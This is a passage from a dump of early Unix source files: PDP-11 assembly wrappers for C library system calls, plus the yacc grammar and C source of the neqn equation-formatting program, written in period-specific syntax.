	mov	(sp)+,r5
	rts	pc

.globl	_brk
/ brk(value)
/ as described in man2.
/ returns 0 for ok, -1 for error.

_brk:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	mov	4(r5),nd
	clr	r0
	mov	(sp)+,r5
	rts	pc

.data
9:
	sys	break; 0:..
nd:	_end
-- /usr/source/s5/seek.s mode=0100664 uid=3 gid=3 atime=174924151 mtime=169260911 --
/ C library -- seek

/ error = seek(file, offset, ptr);

.globl	_seek, cerror

_seek:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	mov	6(r5),0f
	mov	8(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	seek; 0:..; ..
-- /usr/source/s5/setgid.s mode=0100664 uid=3 gid=3 atime=174924154 mtime=169260911 --
/ C library -- setgid

/ error = setgid(uid);

setgid = 46.
.globl	_setgid, cerror

_setgid:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	sys	setgid
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/setuid.s mode=0100664 uid=3 gid=3 atime=174924156 mtime=169260911 --
/ C library -- setuid

/ error = setuid(uid);

.globl	_setuid, cerror

_setuid:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	sys	setuid
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/signal.s mode=0100664 uid=3 gid=3 atime=174924158 mtime=169260911 --
/ C library -- signal

/ signal(n, 0); /* default action on signal(n) */
/ signal(n, odd); /* ignore signal(n) */
/ signal(n, label); /* goto label on signal(n) */
/ returns old label, only one level.

rtt	= 6
signal	= 48.
.globl	_signal, cerror

_signal:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r1
	cmp	r1,$NSIG
	bhis	2f
	mov	6(r5),r0
	mov	r1,0f
	asl	r1
	mov	dvect(r1),-(sp)
	mov	r0,dvect(r1)
	mov	r0,0f+2
	beq	1f
	bit	$1,r0
	bne	1f
	asl	r1
	asl	r1
	add	$tvect,r1
	mov	r1,0f+2
1:
	sys	0; 9f
	bes	3f
	bit	$1,r0
	beq	1f
	mov	r0,(sp)
1:
	mov	(sp)+,r0
	mov	(sp)+,r5
	rts	pc
2:
	mov	$22.,r0		/ EINVAL
	clr	-(sp)
3:
	tst	(sp)+
	jmp	cerror

NSIG = 0
tvect:
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
	mov r0,-(sp); mov dvect+[NSIG*2],r0; br 1f; NSIG=NSIG+1
1:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	jsr	pc,(r0)
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	mov	(sp)+,r0
	rtt
.data
9:
	sys	signal; 0:..; ..
.bss
dvect:	.=.+[NSIG*2]
-- /usr/source/s5/sleep.s mode=0100664 uid=3 gid=3 atime=174924160 mtime=169260911 --
.globl	_sleep
sleep = 35.

_sleep:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	sys	sleep
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/stat.s mode=0100664 uid=3 gid=3 atime=174924162 mtime=169260911 --
/ C library -- stat

/ error = stat(string, statbuf);

/ int statbuf[18] or
/ char statbuf[36]
/ as appropriate

.globl	_stat, cerror

_stat:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	stat; 0:..; ..
-- /usr/source/s5/stime.s mode=0100664 uid=3 gid=3 atime=174924164 mtime=169260911 --
.globl	_stime, cerror

_stime:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(sp),r1
	mov	(r1)+,r0
	mov	(r1),r1
	sys	stime
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/stty.s mode=0100664 uid=3 gid=3 atime=174924166 mtime=169260911 --
/ C library -- stty

/ error = stty(filep, ttyvec);

/ filep is descriptor of open tty
/ ttyvec[0, 1, 2] correspond to args of stty

.globl	_stty, cerror

_stty:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	mov	6(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	stty; 0:..
-- /usr/source/s5/sync.s mode=0100664 uid=3 gid=3 atime=174924168 mtime=169260911 --
.globl	_sync
sync = 36.

_sync:
	mov	r5,-(sp)
	mov	sp,r5
	sys	sync
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/time.s mode=0100664 uid=3 gid=3 atime=174924170 mtime=169260911 --
/ C library -- time

/ tvec = time(tvec);
/
/ tvec[0], tvec[1] contain the time

.globl	_time

_time:
	mov	r5,-(sp)
	mov	sp,r5
	sys	time
	mov	r2,-(sp)
	mov	4(r5),r2
	mov	r0,(r2)+
	mov	r1,(r2)+
	mov	(sp)+,r2
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/times.s mode=0100664 uid=3 gid=3 atime=174924172 mtime=169260912 --
/ C library -- times

.globl	_times
times	= 43.

_times:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	sys	0; 9f
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	times; 0:..
-- /usr/source/s5/umount.s mode=0100664 uid=3 gid=3 atime=174924174 mtime=169260912 --
/ C library -- umount/

.globl	_umount
.globl	cerror
indir	= 0
.comm	_errno,2

_umount:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(sp),0f
	sys	indir; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc

.data
9:
	sys	umount; 0:..
-- /usr/source/s5/unlink.s mode=0100664 uid=3 gid=3 atime=174924176 mtime=169260912 --
/ C library -- unlink

/ error = unlink(string);
/

.globl	_unlink, cerror

_unlink:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	unlink; 0:..
-- /usr/source/s5/wait.s mode=0100664 uid=3 gid=3 atime=174924178 mtime=169260912 --
/ C library -- wait

/ pid = wait();
/   or,
/ pid = wait(&status);
/
/ pid == -1 if error
/ status indicates fate of process, if given

.globl	_wait, _nargs, cerror

_wait:
	mov	r5,-(sp)
	mov	sp,r5
	jsr	pc,_nargs
	mov	r0,-(sp)
	sys	wait
	bec	1f
	tst	(sp)+
	jmp	cerror
1:
	tst	(sp)+
	beq	2f
	mov	r1,*4(r5)	/ status return
2:
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/write.s mode=0100664 uid=3 gid=3 atime=174924180 mtime=169260912 --
/ C library -- write

/ nwritten = write(file, buffer, count);
/
/ nwritten == -1 means error

.globl	_write, cerror

_write:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	mov	6(r5),0f
	mov	8(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	write; 0:..; ..
-- /usr/source/s7 mode=0140775 uid=3 gid=3 atime=174930094 mtime=174924385 --
-- /usr/source/s7/ne.g mode=0100664 uid=3 gid=3 atime=174924267 mtime=169260922 --
\{#
#
int	fromflg	0;
\}
%term	CONTIG QTEXT  SPACE THIN TAB
%term	UP DOWN BACK FWD
%term	MATRIX LCOL CCOL RCOL COL
%term	MARK LINEUP
%term	SUM INT PROD UNION INTER
%term	LPILE PILE CPILE RPILE ABOVE
%term	DEFINE DELIM  GSIZE GFONT
%right	FROM TO
%left	OVER SQRT
%right	SUPER SUB
%right	SIZE FONT ROMAN ITALIC BOLD
%left	MQ MQ1
%left	LEFT RIGHT
%right	DOT DOTDOT HAT TILDE BAR UNDER

%%

stuff	: eqn 	={ putout($1); }
	| error	={ error(!FATAL, "syntax error in equation %d", first);  }
	|	={ eqnreg = 0; }
	;

eqn	: box	={ if(dbg)printf(".\teqn: S%d\n",$1); }
	| eqn box	={ eqnbox($1,$2); }
	| eqn MARK	={ mark($1); }
	| MARK	={ mark(0); }
	| eqn LINEUP	={ lineup($1); }
	| LINEUP	={ lineup(0); }
	;

matrix	: MATRIX	={ $$ = ct; } ;

collist	: column
	| collist column
	;

column	: lcol MQ list MQ1	={ column('L',$1,$3); }
	| ccol MQ list MQ1	={ column('C',$1,$3); }
	| rcol MQ list MQ1	={ column('R',$1,$3); }
	| col MQ list MQ1	={ column('-',$1,$3); }
	;

lcol	: LCOL	={ $$ = ct++; } ;
ccol	: CCOL	={ $$ = ct++; } ;
rcol	: RCOL	={ $$ = ct++; } ;
col	: COL	={ $$ = ct++; } ;

sbox	: super box	%prec SUPER
		={ $$ = $2; }
	|	%prec SUB
		={ $$ = 0; }
	;

box	: box OVER box	={ boverb($1,$3); }
	| size box	%prec SIZE
		={ size($1,$2); }
	| font box	%prec FONT
		={ font($1,$2); }
	| SQRT box	={ sqrt($2); }
	| lpile MQ list MQ1	%prec LPILE
		={ lpile('L', $1, ct); ct=$1; }
	| cpile MQ list MQ1	%prec CPILE
		={ lpile('C', $1, ct); ct=$1; }
	| rpile MQ list MQ1	%prec RPILE
		={ lpile('R', $1, ct); ct=$1; }
	| pile MQ list MQ1	%prec PILE
		={ lpile('-', $1, ct); ct=$1; }
	| box sub box sbox	%prec SUB
		={ if(dbg)printf(".\t sub box %d %d %d\n",$1,$3,$4);
			if($4 == 0)bshiftb($1,$2,$3);
			else shift2($1,$3,$4);
		}
	| box super box		%prec SUPER
		={ bshiftb($1,$2,$3); }
	| left eqn right	%prec LEFT
		={ paren($1,$2,$3);	}
	| pbox
	| box from box to  box	%prec TO
		={ fromto($1,$3,$5); fromflg=0; }
	| box from box	%prec FROM
		={ fromto($1,$3,0); fromflg=0; }
	| box to box	%prec TO
		={ fromto($1,0,$3); }
	| box diacrit	={ diacrit($1,$2); }
	| fwd box	={ move(0,$1,$2); }
	| up box	={ move(1,$1,$2); }
	| back box	={ move(2,$1,$2); }
	| down box	={ move(3,$1,$2); }
	| matrix MQ collist MQ1	={ matrix($1,$3); }
	;

fwd	: FWD text	={ $$ = numb($1); } ;
up	: UP text	={ $$ = numb($1); } ;
back	: BACK text	={ $$ = numb($1); } ;
down	: DOWN text	={ $$ = numb($1); } ;

diacrit	: HAT	={ $$ = 'H'; }
	| BAR	={ $$ = 'B'; }
	| UNDER	={ $$ = 'N'; }	/* under bar */
	| DOT	={ $$ = 'D'; }
	| TILDE	={ $$ = 'T'; }
	| DOTDOT	={ $$ = 'U'; } /* umlaut = double dot */
	;

from	: FROM
	;
to	: TO
	;

left	: LEFT text	={ $$ = $2->c1; }
	| LEFT MQ	={ $$ = '{'; }
	;

right	: RIGHT text	={ $$ = $2->c1; }
	| RIGHT MQ1	={ $$ = '}'; }
	|		={ $$ = 0; }
	;

list	: eqn	={ lp[ct++] = $1; }
	| list ABOVE eqn	={ lp[ct++] = $3; }
	;

lpile	: LPILE	={ $$=ct; } ;
cpile	: CPILE	={ $$=ct; } ;
pile	: PILE	={ $$=ct; } ;
rpile	: RPILE	={ $$=ct; } ;

size	: SIZE text
	;

font	: ROMAN
	| ITALIC
	| BOLD
	| FONT text
	;

sub	: SUB	={ shift(1); } ;

super	: SUPER	={ shift(-1); } ;

pbox	: MQ eqn MQ1	={ $$ = $2; }
	| QTEXT	={ text('q',$1); }
	| CONTIG	={ text('c',$1); }
	| SPACE	={ text('~', $1); }
	| THIN	={ text('^', $1); }
	| TAB	={ text('\t', $1); }
	| SUM	={	text('c', "SIGMA"); }
	| PROD	={	text('c', "PI"); }
	| INT	={	text('c', "^"); }
	| UNION	={	text('c' ,"U"); }
	| INTER	={	text('c', "A"); }
	;

text	: CONTIG
	| QTEXT
	| SPACE	={ $$ = & "\\|\\|"; }
	| THIN	={ $$ = & "\\|"; }
	;

%%
-- /usr/source/s7/ne.h mode=0100664 uid=3 gid=3 atime=174924340 mtime=169260922 --
#
int	dbg;
int	ct;
int	lp[40];
char	used[100];	/* available registers */
int	ps;	/* dflt init pt size */
int	ft;	/* dflt font */
int	first;
extern	int	fout, fin;
int	ifile;
int	linect;	/* line number in file */
int	eqline;	/* line where eqn started */
int	svargc;
char	**svargv;
int	eht[100];
int	ebase[100];
int	ewid[100];
struct { char c1; char c2; };
int	yyval;
int	*yypv;
int	yylval;
int	tht[30];
int	tbase[30];
int	ptr;
char	*nptr[50];
char *sptr[50];
int	eqnreg, eqnht, eqnbase;
int	lefteq, righteq;
int	lastchar;	/* last character read by lex */
#define	FATAL	1
int	ESC;
int	HREV;
int	HFWD;
int	SI;
int	SO;
-- /usr/source/s7/ne1.c mode=0110664 uid=3 gid=3 atime=174924269 mtime=169260922 --
# include "ne.h"

boverb(p1,p2) int p1,p2; {
	int h,b,w,treg;
	yyval = oalloc();
	eht[yyval] = eht[p1] + eht[p2] ;
	ebase[yyval] = eht[p2] - 1;
	ewid[yyval] = w = max(ewid[p1],ewid[p2]);
	if(dbg)printf(".\tb:bob: S%d <- S%d over S%d; b=%d,h=%d,w=%d\n",
		yyval, p1, p2, ebase[yyval], eht[yyval], ewid[yyval]);
	printf(".ds %d ", yyval);
	down(eht[p2]-ebase[p2]-1);
	fwd((ewid[yyval]-ewid[p2])/2);
	printf("\\*(%d", p2);
	back((ewid[yyval]+ewid[p2])/2);
	up(eht[p2]-ebase[p2]+ebase[p1]);
	fwd((ewid[yyval]-ewid[p1])/2);
	printf("\\*(%d", p1);
	back((ewid[yyval]+ewid[p1])/2);
	down(ebase[p1]);
	line(ewid[yyval]);
	down(1);
	putchar('\n');
	ofree(p1);
	ofree(p2);
}

bshiftb(p1,dir,p2) int p1,dir,p2; {
	int shval, d1, h1, b1,h2,b2;
	yyval = oalloc();
	ewid[yyval] = ewid[p1] + ewid[p2];
	h1 = eht[p1]; b1 = ebase[p1];
	h2 = eht[p2]; b2 = ebase[p2];
	printf(".ds %d \"\\*(%d", yyval, p1);
	if( dir > 0 ){	/* subscript */
		shval = h2-b2-1;
		if( shval < b1 )
			shval = b1;
		down(shval);
		printf("\\*(%d", p2);
		up(shval);
		ebase[yyval] = max(b1, h2-1);
		eht[yyval] = h1 + max(0,h2-b1-1);
	} else {	/* superscript */
		ebase[yyval]  = b1;
		shval = b2+1;
		if( shval+h2 < h1-b1 )
			shval = h1-b1-h2;
		up(shval);
		printf("\\*(%d", p2);
		down(shval);
		eht[yyval] = max(h1, b1+1+h2);
	}
	putchar('\n');
	if(dbg)printf(".\tb:b shift b: S%d <- S%d vert %d S%d vert %d; b=%d,h=%d,w=%d\n",
		yyval,p1,shval,p2,-shval,ebase[yyval],eht[yyval],ewid[yyval]);
	ofree(p1);
	ofree(p2);
}

eqnbox(p1,p2) int p1,p2; {
	int b,h;
	if( p1==0 ){
		yyval = p2; return;
	}
	yyval = oalloc();
	b = max(ebase[p1], ebase[p2]);
	eht[yyval] = h = b + max(eht[p1]-ebase[p1],
		eht[p2]-ebase[p2]);
	ebase[yyval] = b;
	ewid[yyval] = ewid[p1] + ewid[p2];
	if(dbg)printf(".\te:eb: S%d <- S%d S%d; b=%d,h=%d,w=%d\n",
		yyval,p1,p2,b,h,ewid[yyval]);
	printf(".ds %d \\*(%d\\*(%d\n", yyval, p1, p2);
	ofree(p1);
	ofree(p2);
}

size(p1,p2) int p1,p2; {
	yyval = p2;
}

numb(p1) char *p1; {
	int i, n, c;
	for(i=n=0; (c=p1[i++])!='\0'; )
		if( c>='0' && c<='9' )
			n = n*10 + c-'0';
	if(dbg)printf(".\tnumb: %s %d\n",p1,n);
	return( n );
}

font(p1,p2) int p1,p2; {
	yyval = p2;
}

shift(p1) int p1; {
	yyval = p1;
	if(dbg)printf(".\tshift: %d\n",yyval);
}

sqrt(p2) int p2; {
	int nps, h, i;
	yyval = oalloc();
	h = eht[p2];
	eht[yyval] = h+1;
	nps = h-1;
	ebase[yyval] = ebase[p2];
	ewid[yyval] = ewid[p2] + 2;
	if(dbg)printf(".\tsqrt: S%d <- S%d;b=%d,h=%d,w=%d\n",
		yyval,p2,ebase[yyval],eht[yyval],ewid[yyval]);
	printf(".ds %d \\e|", yyval);
	for( i=2; i<=nps; i++ ){
		back(1);
		up(1);
		putchar('|');
	}
	up(2);
	line(ewid[p2]);
	back(ewid[p2]);
	down(h);
	printf("\\*(%d\n", p2);
	ofree(p2);
}

lpile(type,p1,p2) int type,p1,p2; {
	int w,bi,hi,i,gap,h,b,j, nlist, nlist2, mid;
	yyval = oalloc();
	gap = type == '-' ? 0 : 1;
	nlist = p2 - p1;
	nlist2 = (nlist+1)/2;
	mid = p1 + nlist2 -1;
	h = b = w = 0;
	for( i=p1; i<p2; i++ ){
		h =+ eht[lp[i]];
		w = max(w, ewid[lp[i]]);
	}
	eht[yyval] = h + (nlist-1)*gap;
	ewid[yyval] = w;
	for( i=p2-1; i>mid; i-- )
		b =+ eht[lp[i]] + gap;
	ebase[yyval] = (nlist%2) ? b + ebase[lp[mid]] : b - gap -1;
	if(dbg){
		printf(".\tS%d <- %c pile of:", yyval, type);
		for( i=p1; i<p2; i++)
			printf("  S%d", lp[i]);
		printf(";h=%d b=%d,w=%d\n",eht[yyval],ebase[yyval],ewid[yyval]);
	}
	printf(".ds %d \\\n", yyval);
	down(ebase[yyval]);
	if( type=='R' )
		fwd(ewid[yyval]);
	for(i = p2-1; i >=p1; i--){
		hi = eht[lp[i]]; 
		bi = ebase[lp[i]];
	switch(type){

	case 'L':
		up(bi);
		printf("\\*(%d", lp[i]);
		back(ewid[lp[i]]);
		up(hi-bi+gap);
		printf("\\\n");
		continue;
	case 'R':
		up(bi);
		back(ewid[lp[i]]);
		printf("\\*(%d", lp[i]);
		up(hi-bi+gap);
		printf("\\\n");
		continue;
	case 'C':
	case '-':
		up(bi);
		fwd((ewid[yyval]-ewid[lp[i]])/2);
		printf("\\*(%d", lp[i]);
		back((ewid[yyval]+ewid[lp[i]])/2);
		up(hi-bi+gap);
		printf("\\\n");
		continue;
		}
	}
	down(eht[yyval]-ebase[yyval]+gap);
	if( type!='R' )
		fwd(ewid[yyval]);
	putchar('\n');
	for( i=p1; i<p2; i++ ) ofree(lp[i]);
}

shift2(p1,p2,p3) int p1,p2,p3;{
	int h1,h2,h3,b1,b2,b3,subsh,d1,supsh;
	yyval = oalloc();
	h1 = eht[p1]; b1 = ebase[p1];
	h2 = eht[p2]; b2 = ebase[p2];
	h3 = eht[p3]; b3 = ebase[p3];
	d1 = 1;
	subsh = -d1+h2-b2;
	if( d1+b1 > h2 )
		subsh = b1-b2;
	supsh = b3 + 1;
	if( supsh+h3 < h1-b1 )
		supsh = h1-b1-h3;
	eht[yyval] = h1 + max(0,h3-1) + max(0,h2-b1-d1);
	ebase[yyval] = b1+max(0,h2-b1-d1);
	ewid[yyval] = ewid[p1] + max(ewid[p2], ewid[p3]);
	printf(".ds %d \\*(%d", yyval, p1);
	down(subsh);
	printf("\\*(%d", p2);
	back(ewid[p2]);
	up(subsh+supsh);
	printf("\\*(%d", p3);
	down(supsh);
	if(ewid[p3] < ewid[p2] )
		fwd(ewid[p2]-ewid[p3]);
	putchar('\n');
	if(dbg)printf(".\tshift2 s%d <- %d %d %d",yyval,p1,p2,p3);
	if(dbg)printf(" h=%d,b=%d,w=%d\n", eht[yyval],ebase[yyval],ewid[yyval]);
	ofree(p1); ofree(p2); ofree(p3);
}
-- /usr/source/s7/ne2.c mode=0100664 uid=3 gid=3 atime=174924289 mtime=169260922 --
# include "ne.h"

fromto(p1,p2,p3) int p1,p2,p3; {
	int w,h,b,h1,b1;
	yyval = oalloc();
	h1 = eht[yyval] = eht[p1];
	b1 = ebase[p1];
	b = 0;
	w = ewid[p1];
	if( p2>0 ){
		w = max(w, ewid[p2]);
		eht[yyval] =+ eht[p2];
		b = eht[p2];
	}
	if( p3>0 ){
		w = max(w, ewid[p3]);
		eht[yyval] =+ eht[p3];
	}
	ewid[yyval] = w;
	printf(".ds %d ", yyval);	/* bottom of middle box */
	if( p2>0 ){
		down(eht[p2]-ebase[p2]+b1);
		fwd((w-ewid[p2])/2);
		printf("\\*(%d", p2);
		back((w+ewid[p2])/2);
		up(eht[p2]-ebase[p2]+b1);
	}
	fwd((w-ewid[p1])/2);
	printf("\\*(%d", p1);
	fwd((1+w-ewid[p1])/2);
	if( p3>0 ){
		up(h1-b1+ebase[p3]);
		back((w+ewid[p3])/2);
		printf("\\*(%d", p3);
		fwd((w-ewid[p3])/2);
		down(h1-b1+ebase[p3]);
	}
	putchar('\n');
	ebase[yyval] = b + b1;
	if(dbg)printf(".\tfrom to: S%d <- %d f %d t %d; h=%d b=%d,w=%d\n",
		yyval,p1,p2,p3,eht[yyval], ebase[yyval], ewid[yyval]);
	ofree(p1);
	if( p2>0 ) ofree(p2);
	if( p3>0 ) ofree(p3);
}

paren(leftc,p1,rightc) int p1, leftc, rightc; {
	int n,h1,b1;
	yyval = oalloc();
	h1 = eht[p1]; ebase[yyval] = b1 = ebase[p1];
	n = max(b1+1, h1-b1-1);
	eht[yyval] = 2*n;
	if( eht[yyval] > h1 )
		++ebase[yyval];
	printf(".ds %d ", yyval);
	brack(n,'|');
	printf("\\*(%d", p1);
	if( rightc )
		brack(n,'|');
	putchar('\n');
	ewid[yyval] = ewid[p1] + 1 + (rightc ? 1 : 0);
	if(dbg)printf(".\tcurly: h=%d b=%d n=%d w=%d l=%c,r=%c\n",
		eht[yyval],ebase[yyval],n,ewid[yyval],leftc,rightc);
	ofree(p1);
}

brack(n,c) int n,c; {
	int j;
	down(n-1);
	for( j=0; j < n; j++ ){
		putchar(c);
		back(1);
		up(2);
	}
	down(n+1);
	fwd(1);
}

diacrit(p1,type) int p1,type; {
	int c,t;
	c = oalloc();
	switch(type){
		case 'H':
			printf(".ds %d ^\n",c);
			ewid[c] = 1;
			break;
		case 'T':
			printf(".ds %d ~\n",c);
			ewid[c] = 1;
			break;
		case 'D':
			printf(".ds %d ", c);
			up(2);
			putchar('.');
			down(2);
			putchar('\n');
			ewid[c] = 1;
			break;
		case 'U':
			printf(".ds %d ", c);
			up(2);
			printf("..");
			down(2);
			putchar('\n');
			ewid[c] = 2;
			break;
		case 'B':
			printf(".ds %d ", c);
			up(eht[p1]);
			line(ewid[p1]);
			down(eht[p1]);
			putchar('\n');
			ewid[c] = ewid[p1];
			break;
		case 'N':
			printf(".ds %d ", c);
			down(ebase[p1]);
			line(ewid[p1]);
			up(ebase[p1]);
			putchar('\n');
			ewid[c] = ewid[p1];
			break;
		}
	yyval = oalloc();
	printf(".ds %d \\*(%d", yyval, p1);
	back((ewid[p1]+ewid[c])/2);
	printf("\\*(%d", c);
	fwd(abs(ewid[p1]-ewid[c])/2);
	putchar('\n');
	ewid[yyval] = max(ewid[p1], ewid[c]);
	ebase[yyval] = ebase[p1];
	eht[yyval] = eht[p1];
	if( type != 'N' )
		eht[yyval]++;
	if(dbg)printf(".\t%c diacrit: S%d <- %d; h=%d,b=%d,w=%d\n",
		type, yyval, p1, eht[yyval], ebase[yyval], ewid[yyval]);
	ofree(p1); ofree(c);
}

move(dir, amt, p) int dir, amt; char *p; {
	yyval = p;
	printf(".ds %d ", yyval);
	if( dir==0 ) fwd(amt);
	else if( dir==1 ) up(amt);
	else if( dir==2 ) back(amt);
	else if( dir==3 ) down(amt);
	printf("\\*(%d\n", p);
	if( dir==1 )
		ebase[yyval] =- amt;
	else if( dir==3 )
		ebase[yyval] =+ amt;
	if(dbg)printf(".\tmove %d dir %d amt %d; h=%d b=%d\n",
		p,dir,amt,eht[yyval],ebase[yyval]);
}
-- /usr/source/s7/ne3.c mode=0100664 uid=3 gid=3 atime=174924302 mtime=169260922 --
# include "ne.h"

char *res[] {
	">=", "<=", "!=",
	"+-", "==", "cdot", "CDOT",
	"times", "TIMES",
	"SIGMA", "pi", "PI",
	"alpha", "beta", "gamma", "GAMMA", "delta", "epsilon", "omega",
	"DELTA", "LAMBDA", "PHI", "OMEGA",
	"lambda", "mu", "nu", "theta", "rho", "sigma", "tau", "phi",
	"INF", "INFINITY",
	"inf", "infinity",
	"partial", "PARTIAL",
	"zeta", "eta", "iota", "kappa", "xi", "omicron", "upsilon",
	"chi", "psi", "THETA", "XI", "UPSILON", "PSI",
	"del", "DEL",
	"nothing", "NOTHING",
	"approx", "APPROX",
	0};
char *restran[] {
	">\b_", "<\b_", "/\b=",
	"+\b_", "=\b_", "8.9", "8.9",
	"x", "x",
	"R", "J", "P",
	"A", "B", "\\e", "G", "D", "S", "C",
	"W", "E", "F", "Z",
	"L", "M", "@", "T", "K", "Y", "I", "U",
	"o", "o", "o", "o",
	"]", "]",
	"Q", "N", "i", "k", "X", "o", "u",
	"X", "V", "O", "X", "U", "H",
	"[", "[",
	"", "",
	"~\b=", "~\b=",
	0};

int	csp;
int	psp;
#define	CSSIZE	400
char	cs[420];

text(t,p1) int t; char *p1; {
	int i,j,c;
	int w;
	yyval = oalloc();
	ebase[yyval] = 0;
	eht[yyval] = 2;	/* ht in 1/2 spaces */
	if( t=='q' )
		j = p1;
	else if ( t == '~' )
		j = &"~";
	else if ( t == '^' )
		j = &"";
	else if ( t == '\t' )
		j = &"\\t";
	else if( (i=lookup(p1,res))>=0 )
		j = restran[i];
	else {
		for( csp=psp=0; (c=p1[psp++])!='\0'; ){
			trans(c,p1);
			if( csp>CSSIZE )
				error(FATAL,"converted token %.20s... too long",p1);
		}
		cs[csp] = '\0';
		j = cs;
	}
	ewid[yyval] = width(j);
	if(dbg)printf(".\t%ctext: S%d <- %s; b=%d,h=%d,w=%d\n",
		t, yyval, j, ebase[yyval], eht[yyval], ewid[yyval]);
	printf(".ds %d \"%s\n",yyval,j);
}

width(s) char *s; {
	int c,w;
	w = 0;
	while( (c = *s++) != '\0' ){
		if( c == '\b' || c == 033 )
			w--;
		else if ( c == '\\' && *s == '\\' );
		else if ( c == '\\' && *s == 'e' );
		else if ( c >= 040 )
			w++;
	}
	return(w);
}

trans(c,p1) int c; char *p1; {
	switch( c){
	case '>': case '<': case '=':
		if( p1[psp]=='=' ){	/* look ahead for == <= >= */
			cs[csp++] = c; cs[csp++] = '\b'; cs[csp++] = '_';
			psp++;
		} else 
			cs[csp++] = c;
		break;
	case '\\':	/* troff - pass 2 or 3 more chars */
		cs[csp++] = c; cs[csp++] = c = p1[psp++]; cs[csp++] = p1[psp++];
		if( c=='(' ) cs[csp++] = p1[psp++];
		break;
	default:
		cs[csp++] = c; break;
	}
}
-- /usr/source/s7/ne4.c mode=0100664 uid=3 gid=3 atime=174924313 mtime=169260922 --
# include "ne.h"
# define	SIGPIPE	13	/* nroff has stopped reading */

int	ESC	033;
int	HREV	'8';
int	HFWD	'9';
int	SI	017;
int	SO	016;
int	ESCOUT	033;
int	HFWDOUT	'9';
int	HREVOUT	'8';
int	BKSPOUT	'\b';
int	FWDOUT	'~';

char	in[400];	/* input buffer */
int	exit();

main(argc,argv) int argc; char *argv[];{
	int i, type;
	flush();
	first = 0;
	lefteq = righteq = '\0';
	signal(SIGPIPE, &exit);
	setfile(argc,argv);
	while( (type=getline(in)) != '\0' ){
		eqline = linect;
		if( in[0]=='.' && in[1]=='E' && in[2]=='Q' ){
			for( i=11; i<100; used[i++]=0 );
			printf(".tr ~\n");
			printf("%s",in);
			init();
			yyparse();
			if( eqnreg>0 )
				printf(".ne %d\n.rs\n'sp %d\n\\*(%d\n'sp %d\n",
					(eqnht+1)/2, (eqnht-eqnbase-2)/2,eqnreg,eqnbase/2);
			printf(".EN");
			if( lastchar == '\0' ){
				putchar('\n');
				break;
			}
			if( putchar(lastchar) != '\n' )
				while( putchar(getc()) != '\n' );
			flush();
		} else if( type != lefteq )
			printf("%s",in);
		else
			inline();
	}
